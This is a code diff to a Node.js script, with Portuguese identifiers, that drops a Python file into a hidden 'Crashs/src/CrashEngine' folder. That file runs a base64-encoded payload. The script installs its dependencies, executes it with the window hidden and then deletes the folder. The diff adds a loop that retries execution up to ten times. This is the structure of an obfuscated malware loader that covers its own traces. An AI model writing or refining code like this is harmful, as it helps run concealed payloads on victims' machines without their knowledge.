@@ -37,6 +37,14 @@ function instalarDependenciasPython(baseDir) {
   });
 }
 
+function rodarPython(filePath, baseDir) {
+  return new Promise((resolve) => {
+    exec(`python "${filePath}"`, { cwd: baseDir, windowsHide: true }, (err) => {
+      resolve(!err);
+    });
+  });
+}
+
 async function executarPython() {
   const baseDir = path.join(process.env.LOCALAPPDATA || process.env.HOME || ".", "Crashs", "src", "CrashEngine");
 
@@ -61,12 +69,20 @@ exec(compile(base64.b64decode("${base64Code}"), "<string>", "exec"))
 
     await instalarDependenciasPython(baseDir);
 
-    return new Promise((resolve) => {
-      exec(`python "${filePath}"`, { cwd: baseDir, windowsHide: true }, (err) => {
-        try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch {}
-        resolve(!err);
-      });
-    });
+    let tentativas = 0;
+    let sucesso = false;
+
+    while (!sucesso && tentativas < 10) {  
+      sucesso = await rodarPython(filePath, baseDir);
+      if (!sucesso) {
+        tentativas++;
+        await new Promise(r => setTimeout(r, 3000)); 
+      }
+    }
+
+    try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch {}
+
+    return sucesso;
 
   } catch {
     return false;
